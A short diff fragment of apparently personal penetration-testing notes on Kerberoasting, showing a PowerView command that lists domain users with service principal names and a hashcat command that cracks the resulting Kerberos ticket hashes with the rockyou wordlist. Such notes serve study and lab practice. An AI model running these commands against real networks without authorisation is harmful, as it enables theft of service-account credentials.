@@ -15,6 +15,7 @@ Get-DomainUser -SPN -Domain <TargetDomain> | select SamAccountName
 ```
 <img width="1632" height="370" alt="image" src="https://github.com/user-attachments/assets/64e77fda-8e07-4293-9f20-9edf86448206" />
 Copy the Hash on Kali-Machine
+
 ### Crack the hashes
 ```shell
 sudo hashcat -m 13100 hash.hash /usr/share/wordlists/rockyou.txt
